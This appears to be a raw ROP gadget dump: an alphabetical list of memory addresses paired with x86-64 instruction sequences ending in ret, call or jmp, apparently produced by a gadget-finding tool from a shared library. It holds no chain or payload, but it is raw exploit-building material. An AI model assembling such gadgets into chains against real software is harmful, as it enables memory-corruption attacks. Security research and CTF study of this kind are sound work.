0x00002aaaaab09f9a : fld xword ptr [rsp - 0x18] ; fld st(0) ; fstp xword ptr [rdi] ; fsubp st(1) ; ret
0x00002aaaaab0a029 : fld xword ptr [rsp - 0x18] ; fstp xword ptr [rdi] ; ret
0x00002aaaaab0a007 : fld xword ptr [rsp - 0x18] ; ret
0x00002aaaaab0a1a9 : fldcw word ptr [rsp - 2] ; ret
0x00002aaaaac1ebd0 : fldenv dword ptr [rsi + 0xf] ; cmp ah, byte ptr [rbx - 0x25] ; cmp ch, byte ptr [rcx] ; ret 0xd089
0x00002aaaaab62ea9 : fldenv dword ptr [rsi + 0xf] ; je 0x8df06 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x00002aaaaab6ab37 : fldenv dword ptr [rsi + 0xf] ; je 0x95b94 ; xor byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x00002aaaaac438e1 : fldenv dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab62da1 : fldenv dword ptr [rsi + 0xf] ; xlatb ; ret
0x00002aaaaab0a12b : fldpi ; add al, 0x66 ; nop ; fstp st(1) ; add rsp, 8 ; ret
0x00002aaaaabfab5b : fldpi ; mov al, 0x49 ; mov ebx, eax ; mov byte ptr [r11], 0 ; ret
0x00002aaaaac6c2b1 : fldz ; call rsp
0x00002aaaaac6c2a9 : fldz ; push qword ptr [rsi + rbp*8 - 0x260c0000] ; out dx, al ; call rsp
0x00002aaaaab1d434 : fmul dword ptr [rax + 0x11] ; rcr byte ptr [rbp + 0x5b], 1 ; ret
0x00002aaaaab5c00e : fmul dword ptr [rax + 0x21] ; ret
0x00002aaaaab53dff : fmul dword ptr [rax + 0x39] ; ret
0x00002aaaaab5cb2b : fmul dword ptr [rax + 0x39] ; ret 0x2f74
0x00002aaaaab8e264 : fmul dword ptr [rax + 0x75db8500] ; fsubr qword ptr [rcx] ; ret
0x00002aaaaab6e046 : fmul dword ptr [rax + 0xf] ; ret
0x00002aaaaaba38d2 : fmul dword ptr [rax + 3] ; adc byte ptr [r8 - 0x7d], r9b ; ret
0x00002aaaaab174d7 : fmul dword ptr [rax - 0x39] ; ret
0x00002aaaaac04651 : fmul dword ptr [rax - 0x3f] ; call 0xffffffffc29c3e68
0x00002aaaaabc87b2 : fmul dword ptr [rax - 0x75] ; jl 0xf37e3 ; sbb byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab49e11 : fmul dword ptr [rax - 0x77] ; ret
0x00002aaaaab92e79 : fmul dword ptr [rax - 0x7d] ; ret
0x00002aaaaab8c406 : fmul dword ptr [rax - 0x7d] ; ret 0x4801
0x00002aaaaabadc23 : fmul dword ptr [rcx + 0x1b8c1] ; add byte ptr [rax], al ; mov rdx, r8 ; jmp 0xd8c44
0x00002aaaaab4c75e : fmul dword ptr [rcx + 0x21] ; ret
0x00002aaaaab28620 : fmul dword ptr [rcx + 0xf] ; ret
0x00002aaaaab2b341 : fmul dword ptr [rdi] ; ret
0x00002aaaaab8daac : fmul dword ptr [rdi] ; xchg eax, ebx ; ret
0x00002aaaaab1cd63 : fmul dword ptr [rdi] ; xchg esi, ebp ; add byte ptr [rax], al ; add byte ptr [rcx - 0x77], al ; ret 0xc083
0x00002aaaaabbf8f0 : fmul qword ptr [rax - 0x77] ; ret
0x00002aaaaab9ceab : fmul qword ptr [rax - 0x7d] ; ret
0x00002aaaaabe2ad5 : fmul qword ptr [rcx + 0x29] ; fisttp word ptr [rax - 0x77] ; ret
0x00002aaaaab126dc : fmul qword ptr [rcx + 0xf] ; mov esi, 0xbe0f2414 ; ret 0x8349
0x00002aaaaab5e339 : fmul qword ptr [rcx - 0x7d] ; ret 0x7f10
0x00002aaaaab6427f : fmul qword ptr [rcx - 0x7d] ; ret 0xf10
0x00002aaaaac84f14 : fmul qword ptr [rdi + 1] ; add byte ptr [rax], ch ; jo 0x1aff17 ; jmp qword ptr [rcx]
0x00002aaaaac74f14 : fmul qword ptr [rdi] ; add byte ptr [rax + 0x5f], cl ; jmp 0x19ff22
0x00002aaaaac78a14 : fmul qword ptr [rdx + 0x7fe80000] ; in eax, dx ; call qword ptr [rcx]
0x00002aaaaab173d2 : fmul st(0) ; ret
0x00002aaaaac5d484 : fmul st(3) ; push qword ptr [rdx - 0x24] ; call qword ptr [rcx]
0x00002aaaaab17350 : fmulp st(1) ; ret
0x00002aaaaaba5af3 : fnsave dword ptr [rcx] ; rol byte ptr [rbx - 0x6bf0fe06], 0xc0 ; ret
0x00002aaaaac4365f : fnsave dword ptr [rdx - 0x10f09923] ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaaad7b7f : fnsave dword ptr [rdx - 0x6b] ; test word ptr [rbx - 0x2e], bp ; cmp dl, byte ptr [rdi] ; ret
0x00002aaaaaba2497 : fnstenv dword ptr [rax + 0x6348000b] ; adc al, 0x98 ; add rax, rdx ; jmp rax
0x00002aaaaaad7532 : fnstenv dword ptr [rdx + rdx - 0x38975393] ; ret
0x00002aaaaac438df : fnstenv dword ptr [rdx - 0x10f09927] ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab0a186 : fnstsw ax ; fstp st(0) ; and eax, 0x200 ; ret
0x00002aaaaab1d062 : fnstsw dword ptr [rax + 1] ; ret
0x00002aaaaac81129 : fpatan ; call qword ptr [rbx]
0x00002aaaaac81169 : fpatan ; call qword ptr [rsi]
0x00002aaaaac811a9 : fpatan ; jmp qword ptr [rcx]
0x00002aaaaab08bd5 : fpatan ; ret
0x00002aaaaac6ecd1 : fprem ; call rsp
0x00002aaaaac7bb89 : frndint ; call qword ptr [rax]
0x00002aaaaac43661 : frstor dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab0a05c : fscale ; fstp st(1) ; ret
0x00002aaaaac69615 : fsincos ; call rax
0x00002aaaaac696b5 : fsincos ; jmp qword ptr [rax]
0x00002aaaaac696d5 : fsincos ; jmp rax
0x00002aaaaac581e7 : fstp dword ptr [rbx + 0x4a315a58] ; ret 0x1b49
0x00002aaaaab6b28e : fstp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00002aaaaab8fd44 : fstp qword ptr [rsp - 0x10] ; movsd xmm0, qword ptr [rsp - 0x10] ; ret
0x00002aaaaab0a188 : fstp st(0) ; and eax, 0x200 ; ret
0x00002aaaaac58560 : fstp st(0) ; ret 0xde5d
0x00002aaaaab0a130 : fstp st(1) ; add rsp, 8 ; ret
0x00002aaaaab0a05e : fstp st(1) ; ret
0x00002aaaaab0f897 : fstp xword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rbx - 0x75], bl ; pop rax ; ret
0x00002aaaaab09fa0 : fstp xword ptr [rdi] ; fsubp st(1) ; ret
0x00002aaaaab0a02d : fstp xword ptr [rdi] ; ret
0x00002aaaaab0a778 : fsub dword ptr [rcx + rcx*4 + 1] ; or rax, 0xffffffffffffffff ; ret
0x00002aaaaab4d95f : fsub dword ptr [rcx + rcx*4 + 2] ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaab0a458 : fsub dword ptr [rcx + rcx*4 + 2] ; mov eax, 0xffffffff ; ret
0x00002aaaaab4e1be : fsub dword ptr [rcx + rcx*4 + 2] ; mov rax, -1 ; ret
0x00002aaaaab0a189 : fsub dword ptr [rip + 0x200] ; ret
0x00002aaaaac43961 : fsub dword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaabaa8c9 : fsub dword ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; call 0xffffffffc2e16840
0x00002aaaaab75ac4 : fsub dword ptr [rsi + 0xf] ; xlatb ; ret
0x00002aaaaabbed61 : fsub dword ptr [rsp + rax*2 - 0x77] ; add byte ptr [rax - 1], bh ; ret
0x00002aaaaaba1672 : fsub qword ptr [rcx + rcx*4 + 4] ; and eax, 0x2d0 ; ret
0x00002aaaaab40c80 : fsub qword ptr [rdi + 0x63480011] ; add al, 0x82 ; add rdx, rax ; jmp rdx
0x00002aaaaab7e8bb : fsub qword ptr [rsi + 0xf] ; jmp 0xa9887
0x00002aaaaac43761 : fsub qword ptr [rsi + 0xf] ; out dx, eax ; shl dword ptr [rsi + 0xf], 1 ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaab5e0bc : fsub qword ptr [rsi + 0xf] ; xlatb ; ret
0x00002aaaaac48bfb : fsub st(3), st(0) ; mov dl, 0x66 ; nop ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac83148 : fsub st(6) ; hlt ; jmp qword ptr [rbx]
0x00002aaaaac5be2d : fsub st(7), st(0) ; jmp qword ptr [rax + 0x24]
0x00002aaaaabd6df2 : fsubp st(0) ; enter -2, -1 ; mov rdi, qword ptr [r15] ; call rbx
0x00002aaaaabd88fb : fsubp st(0) ; mov edi, 0x49ffffe3 ; mov edi, dword ptr [rdi] ; call rbx
0x00002aaaaabd8cfa : fsubp st(0) ; rcr bh, 0xff ; dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaabd8368 : fsubp st(0) ; ret 0xffe8
0x00002aaaaabd8268 : fsubp st(0) ; ret 0xffe9
0x00002aaaaab09fa2 : fsubp st(1) ; ret
0x00002aaaaab9b781 : fsubp st(1) ; ret 0xffec
0x00002aaaaabddaeb : fsubr dword ptr [rbx] ; add byte ptr [rax - 0x77], cl ; ret 0xc148
0x00002aaaaac84df8 : fsubr dword ptr [rsi - 0xb] ; jmp qword ptr [rcx]
0x00002aaaaab8e26b : fsubr qword ptr [rcx] ; ret
0x00002aaaaac6bc41 : fsubr st(5) ; jmp rsp
0x00002aaaaab59c62 : fsubrp st(4) ; xor eax, dword ptr [rax] ; test eax, eax ; js 0x84c79 ; ret
0x00002aaaaac5a238 : fucom st(5) ; loop 0x185291 ; add ch, byte ptr [ebp + ebp*2 + 0x5b] ; ret 0x6f9
0x00002aaaaac5be0d : fucomi st(7) ; jmp rsi
0x00002aaaaab505df : fucomp st(0) ; ret
0x00002aaaaac7b109 : fucomp st(6) ; jmp qword ptr [rsi]
0x00002aaaaac7c069 : fucomp st(7) ; jmp qword ptr [rbx]
0x00002aaaaac5be09 : fucomp st(7) ; lcall ptr [rbx + rbx*8] ; out dx, eax ; jmp rsi
0x00002aaaaab4350e : fucompi st(0) ; adc r8, qword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x38b
0x00002aaaaab4abdd : fucompi st(0) ; cmp eax, 0x89000056 ; ret 0x98eb
0x00002aaaaab4b52d : fucompi st(0) ; in eax, dx ; add byte ptr [rax], r8b ; mov edx, eax ; jmp 0x764d6
0x00002aaaaab9d56d : fucompi st(0) ; int 0xa3
0x00002aaaaabe4a09 : fucompi st(0) ; movabs eax, dword ptr [0x8948f6894c000043] ; ret 0x3bf
0x00002aaaaab938fc : fucompi st(0) ; outsb dx, byte ptr [rsi] ; ret 0xfffc
0x00002aaaaac48547 : fucompi st(0) ; pop rbx ; ret
0x00002aaaaab80e31 : fucompi st(0) ; pop rcx ; sub dh, bh ; dec dword ptr [rax - 0x73] ; cld ; pop rbx ; ret
0x00002aaaaabc8593 : fucompi st(0) ; push rdi ; ret 0xfff2
0x00002aaaaabcd4c8 : fucompi st(0) ; rcl ah, cl ; stc ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaabc40f7 : fucompi st(0) ; ret
0x00002aaaaabe39e0 : fucompi st(0) ; ret 0xf10e
0x00002aaaaab2cfd8 : fucompi st(0) ; ret 0xfc78
0x00002aaaaab08ee0 : fucompi st(0) ; ret 0xfeb9
0x00002aaaaaaf5fd8 : fucompi st(0) ; ret 0xffe8
0x00002aaaaabee168 : fucompi st(0) ; ret 6
0x00002aaaaab5c7c2 : fucompi st(0) ; sub byte ptr [rax - 0x76b70007], al ; ret
0x00002aaaaab0a184 : fxam ; fnstsw ax ; fstp st(0) ; and eax, 0x200 ; ret
0x00002aaaaab61b5d : fxch st(0), st(7) ; or eax, dword ptr [rax] ; ret
0x00002aaaaabd6edb : fyl2x ; dec dword ptr [rax - 0x75] ; jge 0x101ee9 ; call rbx
0x00002aaaaabd6ec0 : fyl2x ; dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaabd6ecd : fyl2x ; dec dword ptr [rcx - 0x75] ; jge 0x101edb ; call rbx
0x00002aaaaac13418 : hlt ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaaba2440 : hlt ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaac76ec0 : hlt ; add byte ptr [rax], al ; add byte ptr [rdx + rbx], dl ; add byte ptr [rax], al ; or byte ptr [rcx], bl ; in eax, dx ; jmp qword ptr [rax]
0x00002aaaaac7f40d : hlt ; add byte ptr [rax], al ; shl byte ptr [rdx], 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac8472c : hlt ; add dword ptr [r8], r8d ; loopne 0x1af78c ; cmc ; call qword ptr [rdx]
0x00002aaaaac6eccd : hlt ; add dword ptr [rax], eax ; fprem ; call rsp
0x00002aaaaac82e2c : hlt ; add dword ptr cs:[rax], eax ; fcompi st(4) ; jmp qword ptr [rcx]
0x00002aaaaac8362c : hlt ; add dword ptr ss:[rax], eax ; and ah, dh ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac84f2c : hlt ; add qword ptr [r8], r8 ; jo 0x1aff2f ; jmp qword ptr [rcx]
0x00002aaaaabda14b : hlt ; add rsp, 0x78 ; pop rbx ; pop rbp ; ret
0x00002aaaaac5d96e : hlt ; call qword ptr [rax - 0x1f000bae]
0x00002aaaaac5d53e : hlt ; call qword ptr [rax - 0x1f000bb4]
0x00002aaaaac81bf2 : hlt ; call qword ptr [rax]
0x00002aaaaac5d686 : hlt ; call qword ptr [rbx]
0x00002aaaaac5d5c6 : hlt ; call qword ptr [rcx]
0x00002aaaaac81baa : hlt ; call qword ptr [rsi]
0x00002aaaaac8254a : hlt ; call rax
0x00002aaaaac5db8e : hlt ; call rdi
0x00002aaaaac5d60a : hlt ; call rdx
0x00002aaaaac83852 : hlt ; call rsi
0x00002aaaaac5d9c6 : hlt ; call rsp
0x00002aaaaac6f5a0 : hlt ; cli ; jmp rsp
0x00002aaaaac7f52c : hlt ; cmc ; add byte ptr [rax], al ; xor byte ptr [rdx + rsi*8], ah ; jmp qword ptr [rcx]
0x00002aaaaac5e04c : hlt ; cmc ; call rsp
0x00002aaaaac83d2c : hlt ; cmp eax, 0x1e500001 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac46c22 : hlt ; cmp eax, dword ptr [rsi - 0xc] ; jne 0x171d4a ; ret
0x00002aaaaac46c21 : hlt ; cmp eax, dword ptr [rsi - 0xc] ; jne 0x171d4b ; ret
0x00002aaaaab7302b : hlt ; cmp ecx, esi ; je 0x9e026 ; ret
0x00002aaaaac6ee40 : hlt ; cmp edi, ecx ; jmp rsp
0x00002aaaaac5d92a : hlt ; dec dword ptr [rax + 0x54fff451] ; push rcx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaabb270e : hlt ; dec dword ptr [rcx - 0x77] ; ret 0x8949
0x00002aaaaac5d74a : hlt ; dec dword ptr [rcx] ; push rbp ; hlt ; call qword ptr [rbx]
0x00002aaaaac5d682 : hlt ; dec dword ptr [rcx] ; push rbx ; hlt ; call qword ptr [rbx]
0x00002aaaaac5d69e : hlt ; dec dword ptr [rdi + 0x53] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d5da : hlt ; dec dword ptr [rdx + 0x51] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d626 : hlt ; dec dword ptr [rsi] ; push rdx ; hlt ; lcall ptr [rax] ; push rdx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac6d1ba : hlt ; dec dword ptr [rsp + rdx*2 + 0x20c40001] ; hlt ; call rsp
0x00002aaaaac5d606 : hlt ; dec eax ; push rcx ; hlt ; call rdx
0x00002aaaaac6c2b0 : hlt ; fldz ; call rsp
0x00002aaaaac83631 : hlt ; hlt ; jmp qword ptr [rsi]
0x00002aaaaac5d5d6 : hlt ; inc dword ptr [rax + 0x51] ; hlt ; dec dword ptr [rdx + 0x51] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d786 : hlt ; inc dword ptr [rax + 0x52] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d9ca : hlt ; inc dword ptr [rax] ; mov ah, dh ; jmp rdx
0x00002aaaaac5d69a : hlt ; inc dword ptr [rbp + 0x53] ; hlt ; dec dword ptr [rdi + 0x53] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d936 : hlt ; inc dword ptr [rbp + 0x55] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaabb83d5 : hlt ; inc dword ptr [rcx - 0x7d] ; cld ; inc dword ptr [rcx - 0x77] ; ror dword ptr [rdi], -0x6c ; ret 0x3ae9
0x00002aaaaac5d5c2 : hlt ; inc dword ptr [rdi] ; push rcx ; hlt ; call qword ptr [rcx]
0x00002aaaaac5d6e6 : hlt ; inc dword ptr [rdi] ; push rsp ; hlt ; call qword ptr [rcx]
0x00002aaaaac6d182 : hlt ; inc dword ptr [rdx + rdx*2 + 0x8040001] ; hlt ; call rsp
0x00002aaaaac5d562 : hlt ; inc eax ; hlt ; inc eax ; hlt ; jmp rax
0x00002aaaaac5d566 : hlt ; inc eax ; hlt ; jmp rax
0x00002aaaaac5d992 : hlt ; inc eax ; push rdx ; hlt ; inc eax ; push rdx ; hlt ; jmp rax
0x00002aaaaac5d996 : hlt ; inc eax ; push rdx ; hlt ; jmp rax
0x00002aaaaac6c8e0 : hlt ; int1 ; call rsp
0x00002aaaaabcae2d : hlt ; ja 0xf5dc7 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac585e8 : hlt ; jmp 0x1835bd
0x00002aaaaab0bcf8 : hlt ; jmp 0xffffffff814c6d08
0x00002aaaaac5d56e : hlt ; jmp qword ptr [rax + 0x22fff44c]
0x00002aaaaac5d99e : hlt ; jmp qword ptr [rax + 0x26fff452]
0x00002aaaaac8314a : hlt ; jmp qword ptr [rbx]
0x00002aaaaac5d842 : hlt ; jmp qword ptr [rcx + 0x22fff452]
0x00002aaaaac81daa : hlt ; jmp qword ptr [rcx]
0x00002aaaaac5d68e : hlt ; jmp qword ptr [rdi]
0x00002aaaaac5d572 : hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d6f2 : hlt ; jmp qword ptr [rip + 0x22fff454]
0x00002aaaaac5d9a2 : hlt ; jmp qword ptr [rsi]
0x00002aaaaac5d542 : hlt ; jmp rax
0x00002aaaaac81452 : hlt ; jmp rcx
0x00002aaaaac8383a : hlt ; jmp rdi
0x00002aaaaac5d9a6 : hlt ; jmp rdx
0x00002aaaaac5d612 : hlt ; jmp rsi
0x00002aaaaac6d282 : hlt ; jmp rsp
0x00002aaaaac46c25 : hlt ; jne 0x171d47 ; ret
0x00002aaaaac46c24 : hlt ; jne 0x171d48 ; ret
0x00002aaaaac8702c : hlt ; jo 0x1b2037 ; add byte ptr [rax], dl ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac5d62a : hlt ; lcall ptr [rax] ; push rdx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d5ca : hlt ; lcall ptr [rbx] ; push rcx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d6ee : hlt ; lcall ptr [rbx] ; push rsp ; hlt ; jmp qword ptr [rip + 0x22fff454]
0x00002aaaaac5d5f6 : hlt ; lcall ptr [rcx + 0x22fff451] ; push rax ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d802 : hlt ; lcall ptr [rcx + 0x53] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d662 : hlt ; ljmp ptr [rbx + 0x22fff452] ; push rax ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d7de : hlt ; ljmp ptr [rdi] ; push rsp ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d632 : hlt ; ljmp ptr [rdx + rdx*2] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac7ac2c : hlt ; lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; push rax ; jle 0x1a5c28 ; jmp qword ptr [rcx]
0x00002aaaaac2f11a : hlt ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac2741e : hlt ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaac2f113 : hlt ; mov ecx, dword ptr [rsi - 4] ; mov qword ptr [rdi - 0xc], rdx ; mov dword ptr [rdi - 4], ecx ; ret
0x00002aaaaac27593 : hlt ; mov edx, dword ptr [rsi - 4] ; mov qword ptr [rdi - 0xc], rcx ; mov dword ptr [rdi - 4], edx ; ret
0x00002aaaaabb60b6 : hlt ; mov qword ptr [rsp + 0x40], rdi ; add rax, rdx ; jmp rax
0x00002aaaaac1ecab : hlt ; movsxd rax, ecx ; add rax, rdi ; sub rax, rdx ; ret
0x00002aaaaac46233 : hlt ; movzx edx, byte ptr [rsi - 0xc] ; sub eax, edx ; ret
0x00002aaaaac5d982 : hlt ; push qword ptr [rax - 0x1f000bad] ; push rdx ; hlt ; jmp rax
0x00002aaaaac5d7ee : hlt ; push qword ptr [rbp + 0x22fff452] ; push rax ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d7e6 : hlt ; push qword ptr [rsi] ; push rcx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d782 : hlt ; push qword ptr [rsi] ; push rdx ; hlt ; inc dword ptr [rax + 0x52] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d546 : hlt ; push rax ; hlt ; jmp rax
0x00002aaaaac5d976 : hlt ; push rax ; push rdx ; hlt ; jmp rax
0x00002aaaaac5d742 : hlt ; push rbp ; push rsp ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac6f750 : hlt ; push rdi ; cli ; jmp rsp
0x00002aaaaab7300b : hlt ; ret
0x00002aaaaac6fdd8 : hlt ; ret 0xfffd
0x00002aaaaabc8458 : hlt ; ret 0xffff
0x00002aaaaac6e50c : hlt ; ret 1
0x00002aaaaac6fda0 : hlt ; std ; dec esp ; adc eax, 0x77440001 ; std ; call rsp
0x00002aaaaac69975 : hlt ; sti ; jmp rax
0x00002aaaaac69935 : hlt ; sti ; push qword ptr [rax - 0xb] ; sti ; inc eax ; idiv bl ; call qword ptr [rax]
0x00002aaaaac58723 : hlt ; stosb byte ptr [rdi], al ; cli ; ret 0xac65
0x00002aaaaac6f550 : hlt ; sub dl, bh ; dec esp ; add al, byte ptr ss:[rax] ; adc al, 0x29 ; cli ; jmp rsp
0x00002aaaaac46237 : hlt ; sub eax, edx ; ret
0x00002aaaaab738ce : hlt ; sub rsp, 8 ; call 0x8ab77
0x00002aaaaaad8cd9 : hlt ; test al, 0x35 ; push rbx ; or byte ptr fs:[rbx + 0x4e], ch ; ret 0x6bba
0x00002aaaaac6c5e0 : hlt ; xchg eax, ecx ; out dx, eax ; dec esp ; add eax, dword ptr [rcx] ; add byte ptr [rdx + rdx*4], al ; out dx, eax ; jmp rsp
0x00002aaaaabab71b : hlt ; xor eax, eax ; cmp cl, byte ptr [rsi] ; je 0xd66be ; pop rbx ; ret
0x00002aaaaab528a9 : hlt ; xor edi, edi ; mov r13, rdx ; call qword ptr [r15]
0x00002aaaaab8e43e : idiv bh ; add rsp, 0x10 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabd9575 : idiv bh ; add rsp, 0x408 ; ret
0x00002aaaaabd937b : idiv bh ; add rsp, 0xd8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac5ed32 : idiv bh ; and bh, byte ptr [rsi + rsi*8 - 1] ; jns 0x189d3a ; jmp qword ptr [rdx]
0x00002aaaaac5ed2a : idiv bh ; and bh, byte ptr [rsi + rsi*8 - 1] ; mov byte ptr [rdx - 0xa], bh ; jmp qword ptr [rdx]
0x00002aaaaac5ecca : idiv bh ; and bh, byte ptr [rsi + rsi*8 - 1] ; scasb al, byte ptr [rdi] ; jns 0x189cd2 ; jmp qword ptr [rdx]
0x00002aaaaac5ed66 : idiv bh ; and bh, byte ptr [rsi + rsi*8 - 1] ; scasb al, byte ptr [rdi] ; jns 0x189d6e ; jmp qword ptr [rdx]
0x00002aaaaac6dcd2 : idiv bh ; cld ; xchg eax, esi ; add dword ptr [rax], eax ; ret 0xfff6
0x00002aaaaac5ecc2 : idiv bh ; imul edi, dword ptr [rdx - 0xa], -1 ; scasb al, byte ptr [rdi] ; jns 0x189cca ; jmp qword ptr [rdx]
0x00002aaaaac5ec76 : idiv bh ; jle 0x189c76 ; jmp rdx
0x00002aaaaac5ed36 : idiv bh ; jns 0x189d36 ; jmp qword ptr [rdx]
0x00002aaaaac6da02 : idiv bh ; lodsb al, byte ptr [rsi] ; mov byte ptr [rcx], al ; add byte ptr [rsp + rsi*2 - 0xa], al ; jmp rsp
0x00002aaaaac5ec6a : idiv bh ; loop 0x189cf3 ; idiv bh ; pop rsp ; jle 0x189c72 ; jmp rdx
0x00002aaaaac5ec72 : idiv bh ; loop 0x189cfb ; idiv bh ; jle 0x189c7a ; jmp rdx
0x00002aaaaac5ed2e : idiv bh ; mov byte ptr [rdx - 0xa], bh ; jmp qword ptr [rdx]
0x00002aaaaabd2a5c : idiv bh ; mov eax, 1 ; add rsp, 8 ; ret
0x00002aaaaac6d78a : idiv bh ; mov esp, 0x5400017b ; and al, 0xf6 ; call rsp
0x00002aaaaac6d702 : idiv bh ; mov esp, 0x94000178 ; adc al, 0xf6 ; call rsp
0x00002aaaaac6d68a : idiv bh ; mov esp, 0xe4000176 ; or al, 0xf6 ; call rsp
0x00002aaaaac6ddaa : idiv bh ; movsb byte ptr [rdi], byte ptr [rsi] ; popfq ; add dword ptr [rax], eax ; push rsp ; div esi ; call rsp
0x00002aaaaab8e3fa : idiv bh ; nop dword ptr [rax] ; pop rbx ; ret
0x00002aaaaac5ec6e : idiv bh ; pop rsp ; jle 0x189c6e ; jmp rdx
0x00002aaaaac5eda6 : idiv bh ; ret 0xf678
0x00002aaaaac5ecc6 : idiv bh ; scasb al, byte ptr [rdi] ; jns 0x189cc6 ; jmp qword ptr [rdx]
0x00002aaaaac5ecce : idiv bh ; scasb al, byte ptr [rdi] ; jns 0x189cce ; jmp qword ptr [rdx]
0x00002aaaaac5ed6a : idiv bh ; scasb al, byte ptr [rdi] ; jns 0x189d6a ; jmp qword ptr [rdx]
0x00002aaaaac5e914 : idiv bh ; test eax, 0xc3fffb00 ; add dh, bh ; jmp rdi
0x00002aaaaabfce9e : idiv bh ; xor eax, eax ; ret
0x00002aaaaac6993d : idiv bl ; call qword ptr [rax]
0x00002aaaaaaf8b86 : idiv byte ptr [rdx - 1] ; cmovs eax, edx ; ret
0x00002aaaaac6997d : idiv ebx ; inc dword ptr [rax - 0x2f000408] ; stc ; sti ; jmp qword ptr [rax]
0x00002aaaaab1d6d9 : idiv ecx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaabf621b : idiv edi ; add rsp, 0x30 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac6e562 : idiv edi ; cld ; ret
0x00002aaaaac6e522 : idiv edi ; cmp al, 0xc3 ; add dword ptr [rax], eax ; xor al, 0xe5 ; idiv edi ; push rsp ; ret
0x00002aaaaabfb8b8 : idiv edi ; dec dword ptr [rax - 0x7d] ; ret
0x00002aaaaac6e502 : idiv edi ; fadd st(2), st(0) ; add dword ptr [rax], eax ; je 0x1994f9 ; idiv edi ; hlt ; ret 1
0x00002aaaaac6e50a : idiv edi ; hlt ; ret 1
0x00002aaaaac6e55a : idiv edi ; in al, -0x3d ; add dword ptr [rax], eax ; test ah, dh ; idiv edi ; cld ; ret
0x00002aaaaac6e532 : idiv edi ; insb byte ptr [rdi], dx ; ret
0x00002aaaaac6e4f2 : idiv edi ; lodsb al, byte ptr [rsi] ; ret 1
0x00002aaaaabd22ad : idiv edi ; mov eax, 1 ; add rsp, 8 ; ret
0x00002aaaaac6df42 : idiv edi ; mov esp, 0x140001a3 ; adc esi, edi ; call rsp
0x00002aaaaac6e042 : idiv edi ; mov esp, 0x40001a6 ; sbb dh, bh ; call rsp
0x00002aaaaac6e32a : idiv edi ; pop rsp ; mov bl, 1 ; add byte ptr [rbp + rdx*2 - 9], dh ; call rsp
0x00002aaaaac6e52a : idiv edi ; push rsp ; ret
0x00002aaaaac6e542 : idiv edi ; pushfq ; ret
0x00002aaaaac6e4da : idiv edi ; ret 1
0x00002aaaaac6e4ea : idiv edi ; xchg eax, esp ; ret 1
0x00002aaaaac6e4d2 : idiv edi ; xor al, 0xc2 ; add dword ptr [rax], eax ; xor al, 0xe3 ; idiv edi ; ret 1
0x00002aaaaab0f6a6 : idiv esi ; ret
0x00002aaaaab0f6a5 : idiv rsi ; ret
0x00002aaaaab8e38c : imul al ; adc al, 5 ; add byte ptr [rbp + 0x390a74db], al ; ret
0x00002aaaaac6a5b0 : imul byte ptr [rdx - 0x55790004] ; cld ; call qword ptr [rsi]
0x00002aaaaab3b8fc : imul cl ; ret
0x00002aaaaab79318 : imul cl ; ret 8
0x00002aaaaac05246 : imul dh ; dec dword ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaabd717d : imul eax ; and eax, 0x49fff1d7 ; mov edi, dword ptr [rbp] ; call rbx
